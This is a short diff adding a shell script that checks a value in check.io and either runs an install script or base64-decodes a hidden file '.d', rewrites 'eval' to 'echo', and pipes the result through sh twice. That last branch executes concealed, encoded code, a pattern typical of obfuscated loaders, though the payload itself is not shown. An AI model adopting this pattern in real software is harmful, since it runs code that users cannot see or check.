@@ -1,0 +1,8 @@
+
+check=`cat check.io`
+if [ $check -eq 0 ]
+then
+sh install
+else
+base64 -d .d | sed s/eval/echo/g | sh | sh
+fi
